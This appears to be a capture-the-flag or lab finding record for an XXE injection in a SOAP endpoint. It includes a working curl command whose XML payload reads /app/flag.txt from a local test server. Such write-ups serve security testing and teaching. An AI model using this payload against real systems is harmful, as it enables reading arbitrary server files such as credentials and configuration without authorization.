findings.title: XXE Injection in SOAP Service - Flag Captured
findings.description: The /soap_service endpoint is vulnerable to XML External Entity (XXE) injection. By crafting a malicious XML payload with a SYSTEM entity referencing a local file, an attacker can read arbitrary files from the server filesystem.

reproduction.command: curl -X POST http://172.17.0.1:56811/soap_service -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>'
reproduction.expected: Response contains file contents in account_id field
